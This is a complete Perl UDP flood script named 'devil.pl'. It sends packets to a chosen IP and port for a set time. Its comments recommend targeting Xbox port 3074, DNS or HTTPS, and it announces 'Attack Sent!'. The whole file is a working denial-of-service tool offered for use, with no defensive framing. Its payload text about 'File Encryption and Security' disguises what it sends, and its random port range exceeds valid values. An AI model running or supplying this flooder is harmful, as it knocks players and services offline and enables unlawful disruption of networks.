#!/usr/bin/perl
 
#IP - Port - Use '3074' for XBOX (Most Common) or 
#'53' for DNS or '443' for HTTPS
#Size - Use '100 - 1250' (Recommended)
 
use Socket; use strict;
print "\n";
 if ($#ARGV != 3) {
print "ERROR:You did that wrong\n";
print "Do perl devil.pl 1.1.1.1 53 69 300\n";
print "Format: IP Port Size Time\n";
  exit(1);
}
my ($ip,$port,$size,$time) = @ARGV; my 
($iaddr,$endtime,$psize,$pport); $iaddr = 
inet_aton("$ip") or die "Cannot connect to $ip\n"; 
$endtime = time() + ($time ? $time : 300); 
socket(flood, PF_INET, SOCK_DGRAM, 17); 
print "Attack Sent!\n";
print "Stop With CTRL C\n"; 
print "|IP|\t\t|Port|\t\t|Size|\t\t|Time|\n";
print "|$ip|\t|$port|\t\t|$size|\t\t|$time|\n"; 
print "Stop With CTRL C" 
unless $time; for (;time() 
<= $endtime;) 
{
$psize = $size ? $size :int(rand(2048-8)+12);
$pport = $port ? $port : int(rand(750000))+1;
 
  send(flood, pack("a$psize","UDP OR TCP OR HTTP Based Packet Transfer Service with Random Data Streams and Strings for File Encryption and Security!"), 0, pack_sockaddr_in($pport, $iaddr));}
